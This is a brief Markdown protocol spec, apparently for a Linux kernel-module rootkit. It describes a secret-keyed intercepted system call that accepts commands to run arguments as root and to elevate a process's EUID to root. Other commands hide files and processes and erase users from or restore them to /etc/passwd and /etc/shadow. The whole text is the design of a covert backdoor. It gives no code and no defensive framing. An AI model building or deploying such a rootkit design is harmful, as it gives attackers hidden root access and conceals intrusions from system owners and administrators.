# protocol
## overview
1. user makes a system call, with these arguments: *secret system call number*, *secret*, *command*, ...
2. module intercepts the system call, and checks that the secret is accurate before evaluating the command

## commands
- `command ARGS` -> execute the arguments as root
- `drop PID` -> set a process's EUID to its UID
- `elevate PID` -> set a process's EUID to root
- `ghost UID` -> remove a user from "/etc/passwd" and "/etc/shadow"
- `hide PATH` -> hide an entity ("/proc" paths are treated as processes)
- `show PATH` -> show a hidden entity ("/proc" paths are treated as processes)
- `unghost UID` -> replace a user in "/etc/passwd" and "/etc/shadow"

